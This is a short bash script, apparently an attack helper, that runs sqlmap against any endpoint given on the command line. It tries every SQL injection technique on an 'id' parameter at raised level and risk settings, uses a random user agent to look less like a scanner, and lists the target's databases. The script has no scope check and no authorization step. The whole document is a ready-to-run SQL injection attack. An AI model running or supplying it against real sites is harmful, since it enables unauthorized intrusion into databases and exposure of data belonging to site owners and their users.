#!/bin/bash
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

BASE_URL=$(echo "$ENDPOINT" | sed 's/\?.*$//')

sqlmap -u "${BASE_URL}?id=1" \
  --batch --random-agent \
  --technique=BEUSTQ \
  --dbs \
  --threads=4 \
  --timeout=15 \
  --retries=2 \
  --level=3 --risk=2 \
  2>&1 | tail -50
